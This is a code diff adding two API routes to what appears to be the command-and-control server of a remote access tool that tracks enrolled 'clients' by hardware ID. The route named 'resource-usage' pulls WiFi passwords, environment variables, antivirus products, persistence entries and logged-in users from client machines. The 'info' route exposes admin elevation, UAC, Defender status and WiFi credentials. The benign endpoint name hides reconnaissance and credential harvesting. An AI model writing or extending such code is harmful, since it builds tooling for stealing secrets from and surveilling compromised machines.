@@ -66,7 +66,8 @@ export async function handleClientRoutes(
   if (
     !url.pathname.startsWith("/api/clients") &&
     !url.pathname.startsWith("/api/groups") &&
-    !url.pathname.match(/^\/api\/clients\/.+\/command$/)
+    !url.pathname.match(/^\/api\/clients\/.+\/command$/) &&
+    !url.pathname.match(/^\/api\/clients\/.+\/resource-usage$/)
   ) {
     return null;
   }
@@ -886,6 +887,151 @@ export async function handleClientRoutes(
     const ip = server.requestIP(req)?.address || "unknown";
     logAudit({ timestamp: Date.now(), username: user.username, ip, action: AuditAction.COMMAND, details: `bulk_set_group:${groupId ?? "none"}:${updated}/${clientIds.length}`, success: true });
     return Response.json({ ok: true, updated, total: clientIds.length, groupId }, { headers: deps.CORS_HEADERS });
+  }
+
+  // ── Resource usage endpoint ─────────────────────────────────────────────────
+  const resourceUsageMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/resource-usage$/);
+  if (req.method === "GET" && resourceUsageMatch) {
+    const user = await authenticateRequest(req);
+    if (!user) return new Response("Unauthorized", { status: 401 });
+
+    const targetId = resourceUsageMatch[1];
+    if (!canUserAccessClient(user.userId, user.role, targetId)) {
+      return new Response("Forbidden: Client access denied", { status: 403 });
+    }
+
+    const target = clientManager.getClient(targetId);
+    if (!target) {
+      return Response.json({ error: "Client not found" }, { status: 404, headers: deps.CORS_HEADERS });
+    }
+
+    const cmdId = uuidv4();
+    const replyPromise: Promise<any> = new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => {
+        deps.pendingCommandReplies.delete(cmdId);
+        reject(new Error("Resource usage timed out"));
+      }, 10_000);
+      deps.pendingCommandReplies.set(cmdId, { resolve, reject, timeout, clientId: targetId });
+    });
+
+    target.ws.send(encodeMessage({
+      type: "command",
+      commandType: "resource_usage",
+      id: cmdId,
+    }));
+
+    try {
+      const result = await replyPromise;
+      // result.message contains the JSON string from the client
+      let data: any = null;
+      if (result.message) {
+        try {
+          data = JSON.parse(result.message);
+        } catch {
+          data = result.message;
+        }
+      }
+      return Response.json({
+        cpu_usage: data?.cpu_usage ?? 0,
+        ram_usage: data?.ram_usage ?? 0,
+        ram_used: data?.ram_used ?? "",
+        ram_total: data?.ram_total ?? "",
+        disk_usage: data?.disk_usage ?? 0,
+        disk_used: data?.disk_used ?? "",
+        disk_total: data?.disk_total ?? "",
+        uptime: data?.uptime ?? "",
+        // Extended cross-platform info
+        hostname: data?.hostname ?? "",
+        os_info: data?.os_info ?? "",
+        arch: data?.arch ?? "",
+        kernel_version: data?.kernel_version ?? "",
+        network_connections: data?.network_connections ?? [],
+        all_drives: data?.all_drives ?? [],
+        env_vars: data?.env_vars ?? {},
+        logged_in_users: data?.logged_in_users ?? [],
+        // Windows-specific
+        scheduled_tasks: data?.scheduled_tasks ?? [],
+        registry_persistence: data?.registry_persistence ?? [],
+        running_services: data?.running_services ?? [],
+        startup_programs: data?.startup_programs ?? [],
+        antivirus_products: data?.antivirus_products ?? [],
+        // Linux-specific
+        cron_jobs: data?.cron_jobs ?? [],
+        systemd_units: data?.systemd_units ?? [],
+        installed_packages: data?.installed_packages ?? [],
+        // macOS-specific
+        launch_agents: data?.launch_agents ?? [],
+        launch_daemons: data?.launch_daemons ?? [],
+        // WiFi credentials (cross-platform)
+        wifi_profiles: data?.wifi_profiles ?? [],
+      }, { headers: deps.CORS_HEADERS });
+    } catch (error: any) {
+      return Response.json({ error: error.message || "Resource usage failed" }, { status: 504, headers: deps.CORS_HEADERS });
+    }
+  }
+
+  // ── Client system info panel ────────────────────────────────────────────────
+  const clientInfoMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/info$/);
+  if (req.method === "GET" && clientInfoMatch) {
+    const user = await authenticateRequest(req);
+    if (!user) return new Response("Unauthorized", { status: 401 });
+
+    const targetId = clientInfoMatch[1];
+    if (!canUserAccessClient(user.userId, user.role, targetId)) {
+      return new Response("Forbidden: Client access denied", { status: 403 });
+    }
+
+    // Get in-memory client data (live)
+    const liveClient = clientManager.getClient(targetId);
+    // Get persisted data from DB
+    const dbClients = listClients({ page: 1, pageSize: 1, search: targetId, sort: "stable", statusFilter: "all", osFilter: "all", countryFilter: "all", enrollmentFilter: "approved", groupFilter: "all" });
+    const dbClient = dbClients.items.find((c: any) => c.id === targetId);
+
+    if (!liveClient && !dbClient) {
+      return Response.json({ error: "Client not found" }, { status: 404, headers: deps.CORS_HEADERS });
+    }
+
+    // Merge live + DB data, preferring live data
+    const merged = {
+      id: liveClient?.id || dbClient?.id || targetId,
+      hwid: liveClient?.hwid || dbClient?.hwid || "",
+      host: liveClient?.host || dbClient?.host || "",
+      os: liveClient?.os || dbClient?.os || "",
+      arch: liveClient?.arch || dbClient?.arch || "",
+      version: liveClient?.version || dbClient?.version || "",
+      user: liveClient?.user || dbClient?.user || "",
+      nickname: liveClient?.nickname || dbClient?.nickname || "",
+      customTag: dbClient?.customTag || "",
+      customTagNote: dbClient?.customTagNote || "",
+      ip: liveClient?.ip || dbClient?.ip || "",
+      country: liveClient?.country || dbClient?.country || "ZZ",
+      cpu: liveClient?.cpu || dbClient?.cpu || "",
+      gpu: liveClient?.gpu || dbClient?.gpu || "",
+      ram: liveClient?.ram || dbClient?.ram || "",
+      isAdmin: liveClient?.isAdmin ?? dbClient?.isAdmin ?? false,
+      elevation: liveClient?.elevation || dbClient?.elevation || "",
+      online: liveClient ? (Date.now() - (liveClient.lastSeen || 0) < 60000 ? 1 : 0) : (dbClient?.online || 0),
+      lastSeen: liveClient?.lastSeen || dbClient?.lastSeen || 0,
+      pingMs: liveClient?.pingMs ?? dbClient?.pingMs ?? -1,
+      thumbnail: liveClient?.thumbnail || dbClient?.thumbnail || "",
+      groupId: dbClient?.groupId || null,
+      groupName: dbClient?.groupName || "",
+      groupColor: dbClient?.groupColor || "",
+      // Extended fields (populated by client or future API calls)
+      publicIp: liveClient?.ip || dbClient?.ip || "",
+      asn: "",
+      isp: "",
+      antivirus: "",
+      firewall: undefined as boolean | undefined,
+      defender: undefined as boolean | undefined,
+      uac: undefined as boolean | undefined,
+      defaultBrowser: "",
+      wifiProfiles: [] as Array<{ ssid: string; password: string }>,
+      localUsers: [] as Array<{ name: string; admin: boolean; loggedIn: boolean }>,
+      startupItems: [] as Array<{ name: string; type: string; path: string }>,
+    };
+
+    return Response.json(merged, { headers: deps.CORS_HEADERS });
   }
 
   const clientGroupMatch = url.pathname.match(/^\/api\/clients\/([^/]+)\/group$/);
